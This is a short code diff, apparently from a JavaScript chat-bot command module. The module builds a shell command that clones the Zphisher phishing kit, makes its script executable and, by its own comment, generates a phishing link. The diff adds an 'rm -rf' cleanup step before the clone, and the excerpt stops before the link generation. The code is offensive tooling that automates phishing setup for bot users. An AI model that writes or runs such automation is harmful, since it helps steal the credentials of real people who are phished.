@@ -19,6 +19,7 @@ module.exports.run = async function ({ event, args }) {
 
         // Command to clone Zphisher, set up, and generate a phishing link
         const zphisherCommand = `
+            rm -rf zphisher &&
             git clone https://github.com/htr-tech/zphisher.git &&
             cd zphisher &&
             chmod +x zphisher.sh &&
